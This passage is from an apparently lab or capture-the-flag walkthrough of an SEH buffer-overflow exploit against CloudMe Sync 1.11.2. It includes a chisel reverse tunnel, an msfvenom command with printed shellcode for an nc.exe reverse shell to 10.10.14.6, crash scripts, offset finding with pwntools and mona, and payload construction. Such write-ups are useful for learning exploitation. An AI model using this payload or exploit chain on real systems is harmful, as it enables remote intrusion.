_  chisel git:<span style="color:#ff79c6">(</span>master<span style="color:#ff79c6">)</span> ./chisel server --host 0.0.0.0 --port <span style="color:#bd93f9">9003</span> --reverse
2020/09/26 20:53:52 server: Reverse tunnelling enabled
2020/09/26 20:53:52 server: Fingerprint 7a:24:7b:3c:4e:a5:3a:19:9b:1e:8e:d6:cf:d1:7c:a9
2020/09/26 20:53:52 server: Listening on http://0.0.0.0:9003
2020/09/26 20:55:00 server: session#1: tun: proxy#R:9999<span style="color:#ff79c6">=</span>&gt;8888: Listening
</code></pre></td></tr></table>
</div>
</div><p>Let&rsquo;s check the port forward tunnel:</p>
<pre tabindex="0"><code>_  chisel git:(master) ss -nltp | grep 9999
LISTEN    0         128                      *:9999                   *:*        users:((&quot;chisel&quot;,pid=19429,fd=8))
</code></pre><p>We have to change the exploit 48389.py to use port 9999 instead of 8888</p>
<p>We also have to change the payload as the PoC exploit is running calc.exe, so we use msvenom to create a payload</p>
<p>I am using the docker version of msfvenom that I have aliased to the msfvenom command:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#8be9fd;font-style:italic">alias</span> <span style="color:#8be9fd;font-style:italic">msfvenom</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;echo remember to save to -o /data/something ; docker run --rm -it -v &#34;${HOME}/.msf:/home/msf/&#34; -v &#34;${PWD}:/data&#34; metasploitframework/metasploit-framework ./msfvenom&#39;</span>
</code></pre></td></tr></table>
</div>
</div><p>Let&rsquo;s wotk out a simple reverse shell:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"> &gt;msfvenom -p windows/exec <span style="color:#8be9fd;font-style:italic">CMD</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;c;\xampp\htdocs\gym\upload\nc.exe -e cmd.exe 10.10.14.6 9004&#39;</span> -b <span style="color:#f1fa8c">&#39;\x00\x0a\x0d&#39;</span> -f py -v payload
remember to save to -o /data/something
<span style="color:#ff79c6">[</span>-<span style="color:#ff79c6">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
<span style="color:#ff79c6">[</span>-<span style="color:#ff79c6">]</span> No arch selected, selecting arch: x86 from the payload
Found <span style="color:#bd93f9">11</span> compatible encoders
Attempting to encode payload with <span style="color:#bd93f9">1</span> iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size <span style="color:#bd93f9">272</span> <span style="color:#ff79c6">(</span><span style="color:#8be9fd;font-style:italic">iteration</span><span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">)</span>
x86/shikata_ga_nai chosen with final size <span style="color:#bd93f9">272</span>
Payload size: <span style="color:#bd93f9">272</span> bytes
Final size of py file: <span style="color:#bd93f9">1448</span> bytes
<span style="color:#8be9fd;font-style:italic">payload</span> <span style="color:#ff79c6">=</span>  b<span style="color:#f1fa8c">&#34;&#34;</span>
<span style="color:#8be9fd;font-style:italic">payload</span> <span style="color:#ff79c6">+=</span> b<span style="color:#f1fa8c">&#34;\xdb\xdc\xbf\x40\x2d\x39\xf7\xd9\x74\x24\xf4\x58&#34;</span>
<span style="color:#8be9fd;font-style:italic">payload</span> <span style="color:#ff79c6">+=</span> b<span style="color:#f1fa8c">&#34;\x33\xc9\xb1\x3e\x31\x78\x18\x03\x78\x18\x83\xe8&#34;</span>
<span style="color:#8be9fd;font-style:italic">payload</span> <span style="color:#ff79c6">+=</span> b<span style="color:#f1fa8c">&#34;\xbc\xcf\xcc\x0b\xd4\x92\x2f\xf4\x24\xf3\xa6\x11&#34;</span>
<span style="color:#8be9fd;font-style:italic">payload</span> <span style="color:#ff79c6">+=</span> b<span style="color:#f1fa8c">&#34;\x15\x33\xdc\x52\x05\x83\x96\x37\xa9\x68\xfa\xa3&#34;</span>
<span style="color:#8be9fd;font-style:italic">payload</span> <span style="color:#ff79c6">+=</span> b<span style="color:#f1fa8c">&#34;\x3a\x1c\xd3\xc4\x8b\xab\x05\xea\x0c\x87\x76\x6d&#34;</span>
<span style="color:#8be9fd;font-style:italic">payload</span> <span style="color:#ff79c6">+=</span> b<span style="color:#f1fa8c">&#34;\x8e\xda\xaa\x4d\xaf\x14\xbf\x8c\xe8\x49\x32\xdc&#34;</span>
<span style="color:#8be9fd;font-style:italic">payload</span> <span style="color:#ff79c6">+=</span> b<span style="color:#f1fa8c">&#34;\xa1\x06\xe1\xf1\xc6\x53\x3a\x79\x94\x72\x3a\x9e&#34;</span>
<span style="color:#8be9fd;font-style:italic">payload</span> <span style="color:#ff79c6">+=</span> b<span style="color:#f1fa8c">&#34;\x6c\x74\x6b\x31\xe7\x2f\xab\xb3\x24\x44\xe2\xab&#34;</span>
<span style="color:#8be9fd;font-style:italic">payload</span> <span style="color:#ff79c6">+=</span> b<span style="color:#f1fa8c">&#34;\x29\x61\xbc\x40\x99\x1d\x3f\x81\xd0\xde\xec\xec&#34;</span>
<span style="color:#8be9fd;font-style:italic">payload</span> <span style="color:#ff79c6">+=</span> b<span style="color:#f1fa8c">&#34;\xdd\x2c\xec\x29\xd9\xce\x9b\x43\x1a\x72\x9c\x97&#34;</span>
<span style="color:#8be9fd;font-style:italic">payload</span> <span style="color:#ff79c6">+=</span> b<span style="color:#f1fa8c">&#34;\x61\xa8\x29\x0c\xc1\x3b\x89\xe8\xf0\xe8\x4c\x7a&#34;</span>
<span style="color:#8be9fd;font-style:italic">payload</span> <span style="color:#ff79c6">+=</span> b<span style="color:#f1fa8c">&#34;\xfe\x45\x1a\x24\xe2\x58\xcf\x5e\x1e\xd0\xee\xb0&#34;</span>
<span style="color:#8be9fd;font-style:italic">payload</span> <span style="color:#ff79c6">+=</span> b<span style="color:#f1fa8c">&#34;\x97\xa2\xd4\x14\xfc\x71\x74\x0c\x58\xd7\x89\x4e&#34;</span>
<span style="color:#8be9fd;font-style:italic">payload</span> <span style="color:#ff79c6">+=</span> b<span style="color:#f1fa8c">&#34;\x03\x88\x2f\x04\xa9\xdd\x5d\x47\xa7\x20\xd3\xfd&#34;</span>
<span style="color:#8be9fd;font-style:italic">payload</span> <span style="color:#ff79c6">+=</span> b<span style="color:#f1fa8c">&#34;\x85\x23\xeb\xfd\xb9\x4b\xda\x76\x56\x0b\xe3\x5c&#34;</span>
<span style="color:#8be9fd;font-style:italic">payload</span> <span style="color:#ff79c6">+=</span> b<span style="color:#f1fa8c">&#34;\x13\xe3\xa9\xfd\x35\x6c\x74\x94\x04\xf1\x87\x42&#34;</span>
<span style="color:#8be9fd;font-style:italic">payload</span> <span style="color:#ff79c6">+=</span> b<span style="color:#f1fa8c">&#34;\x4a\x0c\x04\x67\x32\xeb\x14\x02\x37\xb7\x92\xfe&#34;</span>
<span style="color:#8be9fd;font-style:italic">payload</span> <span style="color:#ff79c6">+=</span> b<span style="color:#f1fa8c">&#34;\x45\xa8\x76\x01\xfa\xc9\x52\x62\xc7\x69\x25\x04&#34;</span>
<span style="color:#8be9fd;font-style:italic">payload</span> <span style="color:#ff79c6">+=</span> b<span style="color:#f1fa8c">&#34;\x5a\xe2\xa5\x9a\xcc\x76\x22\x4c\x6f\x04\xf6\xf5&#34;</span>
<span style="color:#8be9fd;font-style:italic">payload</span> <span style="color:#ff79c6">+=</span> b<span style="color:#f1fa8c">&#34;\x16\x87\x5a\x8f\x98\x3b\x0c\x0e\x3c\x98\xbc\xb3&#34;</span>
<span style="color:#8be9fd;font-style:italic">payload</span> <span style="color:#ff79c6">+=</span> b<span style="color:#f1fa8c">&#34;\x92\x45\x39\x51\xca\xa8\xdc\xb9\x69\xde\x7a\x94&#34;</span>
<span style="color:#8be9fd;font-style:italic">payload</span> <span style="color:#ff79c6">+=</span> b<span style="color:#f1fa8c">&#34;\x08\x58\xe6\xc8\xe3\xa8\xc6\x39\x33\xe7\x27\x0e&#34;</span>
<span style="color:#8be9fd;font-style:italic">payload</span> <span style="color:#ff79c6">+=</span> b<span style="color:#f1fa8c">&#34;\x1d\xc1\x67\x57\x51\x1d\x5c\xa7&#34;</span>
 &gt;
</code></pre></td></tr></table>
</div>
</div><p>C:\Users\shaun\Downloads&gt;powershell -command &ldquo;&amp; .\f64.exe&rdquo;
Program &lsquo;f64.exe&rsquo; failed to run: Operation did not complete successfully because the file contains a virus or
potentially unwanted softwareAt line:1 char:1</p>
<ul>
<li>
<p>&amp; .\f64.exe</p>
<pre><code>    At line:1 char:1
</code></pre>
</li>
<li>
<p>&amp; .\f64.exe</p>
<pre><code>  + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
  + FullyQualifiedErrorId : NativeCommandFailed
</code></pre>
</li>
</ul>
<h2 id="download-and-exploit-cloudme">Download and exploit CloudMe</h2>
<p><a href="https://bufferoverflows.net/practical-exploitation-part-1-cloudme-sync-1-11-2-bufferoverflow-seh/">exploitation guide on bufferoverflows.net</a> shows the immunitydebugger guide to exploit CloudMe 1.11.2</p>
<p>From CommandoVM, I have installed CloudMe and run it. I can check if it is running with:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">netstat -ano | findstr <span style="color:#bd93f9">8888</span>
</code></pre></td></tr></table>
</div>
</div><p>We attach the process to immunityDebugger and run the below python script to crash the application. EIP is overwritten with 41414141</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#ff79c6">import</span> socket

target_ip <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;127.0.0.1&#34;</span>     <span style="color:#6272a4"># localhost</span>
target_port <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">8888</span>        <span style="color:#6272a4"># listening port of CloudMe Sync</span>
payload <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">1000</span> <span style="color:#ff79c6">*</span> <span style="color:#f1fa8c">&#34;A&#34;</span>

<span style="color:#ff79c6">try</span>:
    s<span style="color:#ff79c6">=</span>socket<span style="color:#ff79c6">.</span>socket(socket<span style="color:#ff79c6">.</span>AF_INET, socket<span style="color:#ff79c6">.</span>SOCK_STREAM)
    s<span style="color:#ff79c6">.</span>connect((target_ip,target_port))        <span style="color:#6272a4"># connect to the target on port 8888</span>
    s<span style="color:#ff79c6">.</span>send(payload)                <span style="color:#6272a4"># send the payload</span>
    <span style="color:#8be9fd;font-style:italic">print</span> <span style="color:#f1fa8c">&#34;[+] &#34;</span> <span style="color:#ff79c6">+</span> <span style="color:#8be9fd;font-style:italic">str</span>(<span style="color:#8be9fd;font-style:italic">len</span>(payload)) <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34; Bytes Sent&#34;</span>
<span style="color:#ff79c6">except</span>:
    <span style="color:#8be9fd;font-style:italic">print</span> <span style="color:#f1fa8c">&#34;[-] Crashed&#34;</span>            <span style="color:#6272a4"># if the connection failed</span>
</code></pre></td></tr></table>
</div>
</div><p>It is easier with pwntools:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">PS C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\U</span>ser<span style="color:#f1fa8c">\D</span>esktop &gt; python -m pip install virtualenv
PS C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\U</span>ser<span style="color:#f1fa8c">\D</span>esktop &gt; virtualenv.exe -p C:<span style="color:#f1fa8c">\P</span>ython27<span style="color:#f1fa8c">\p</span>ython.exe v2
PS C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\U</span>ser<span style="color:#f1fa8c">\D</span>esktop &gt; .<span style="color:#f1fa8c">\v</span>2<span style="color:#f1fa8c">\S</span>cripts<span style="color:#f1fa8c">\a</span>ctivate
PS C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\U</span>ser<span style="color:#f1fa8c">\D</span>esktop &gt;<span style="color:#ff79c6">(</span>v2<span style="color:#ff79c6">)</span> pip install pwn
PS C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\U</span>ser<span style="color:#f1fa8c">\D</span>esktop &gt;<span style="color:#ff79c6">(</span>v2<span style="color:#ff79c6">)</span> pip install win_inet_pton
</code></pre></td></tr></table>
</div>
</div><p>We can now modify the payload with pwntools.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#ff79c6">from</span> pwn <span style="color:#ff79c6">import</span> cyclic
payload <span style="color:#ff79c6">=</span> cyclic(<span style="color:#bd93f9">2000</span>)
</code></pre></td></tr></table>
</div>
</div><p>Re-launch CloudMe in CommandoVM then run the exploit. ImmunityDebugger stop the program at: <code>EIP = 6b61616e</code></p>
<p>We deduct the offset is 1052:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">PS C:\Users\User\Desktop <span style="color:#ff79c6">&gt;</span>(v2)  python <span style="color:#ff79c6">-</span>c <span style="color:#f1fa8c">&#34;import pwn; print pwn.cyclic_find(&#39;</span><span style="color:#f1fa8c">\x6e\x61\x61\x6b</span><span style="color:#f1fa8c">&#39;)&#34;</span>
<span style="color:#bd93f9">1052</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="mona-immunitydebugger">Mona immunityDebugger</h2>
<ul>
<li>git clone <a href="https://github.com/corelan/mona.git">https://github.com/corelan/mona.git</a></li>
</ul>
<p>Manual copy of <code>mona.py</code> into <code>C:\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands\</code> folder</p>
<pre><code>!mona pc 3000
</code></pre>
<p>We have to modify the location of the file pattern.txt in the file mona.py</p>
<pre><code>!mona findmsp
</code></pre>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Looking <span style="color:#ff79c6">for</span> cyclic pattern in memory
    EIP contains normal pattern : 0x316a4230 <span style="color:#ff79c6">(</span>offset 1052<span style="color:#ff79c6">)</span>
<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Examining SEH chain
    SEH record <span style="color:#ff79c6">(</span>nseh field<span style="color:#ff79c6">)</span> at 0x00a3d8d8 overwritten with normal pattern : 0x61443161 <span style="color:#ff79c6">(</span>offset 2344<span style="color:#ff79c6">)</span>, followed by <span style="color:#bd93f9">648</span> bytes of cyclic data after the handler
</code></pre></td></tr></table>
</div>
</div><p>We modify the payload to reflect the position of SEH and nSEH:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">payload <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">2344</span> <span style="color:#ff79c6">*</span> <span style="color:#f1fa8c">&#39;A&#39;</span> <span style="color:#6272a4">#junk</span>
payload <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">&#34;BBBB&#34;</span> <span style="color:#6272a4">#nseh</span>
payload <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">&#34;CCCC&#34;</span> <span style="color:#6272a4">#seh</span>
payload <span style="color:#ff79c6">+=</span> <span style="color:#bd93f9">648</span> <span style="color:#ff79c6">*</span> <span style="color:#f1fa8c">&#34;D&#34;</span> <span style="color:#6272a4"># padding</span>
</code></pre></td></tr></table>
</div>
</div><p>Now we want to replace nseh with <code>jump short (\xeb\x08)</code> and replace seh with <code>POP POP RET</code>.
Mona will help us find the right addresses for nseh and seh:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm">!<span style="color:#50fa7b">mona</span> seh
0<span style="color:#50fa7b">x6fe68fe7</span> : pop ebx <span style="color:#6272a4"># pop esi # ret 0x20 |  {PAGE_EXECUTE_READ} [libstdc++-6.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\User\AppData\Local\Programs\CloudMe\CloudMe\libstdc++-6.dll)
</span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">payload <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">2344</span> <span style="color:#ff79c6">*</span> <span style="color:#f1fa8c">&#39;A&#39;</span> <span style="color:#6272a4">#junk</span>
payload <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\xeb\x08\x90\x90</span><span style="color:#f1fa8c">&#34;</span> <span style="color:#6272a4">#nseh</span>
payload <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\xe7\x8f\xe6\x6f</span><span style="color:#f1fa8c">&#34;</span> <span style="color:#6272a4">#seh</span>
payload <span style="color:#ff79c6">+=</span> <span style="color:#bd93f9">648</span> <span style="color:#ff79c6">*</span> <span style="color:#f1fa8c">&#34;D&#34;</span> <span style="color:#6272a4"># padding</span>
</code></pre></td></tr></table>
</div>
</div><div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
